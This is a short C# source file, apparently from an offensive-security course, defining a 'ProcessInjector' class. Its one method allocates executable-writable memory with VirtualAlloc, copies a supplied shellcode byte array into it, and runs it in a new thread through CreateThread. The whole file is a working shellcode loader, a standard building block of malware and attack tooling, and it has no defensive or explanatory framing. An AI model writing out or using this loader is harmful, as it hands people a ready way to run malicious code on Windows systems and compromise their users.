using System;
using System.Runtime.InteropServices;

namespace session2
{
    class ProcessInjector
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint size, uint fAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr CreateThread(IntPtr threadAttributes, uint size, IntPtr threadStartAddress, IntPtr lpParameter, uint creationFlags, IntPtr threadID);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern uint WaitForSingleObject(IntPtr handle, uint waitCriteria);

        public void Inject(byte[] shell) {
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shell.Length, 0x1000 | 0x2000, 0x40);
            Marshal.Copy(shell, 0, funcAddr, shell.Length);

            IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(threadHandle, 0xFFFFFFFF);
        }
    }
}
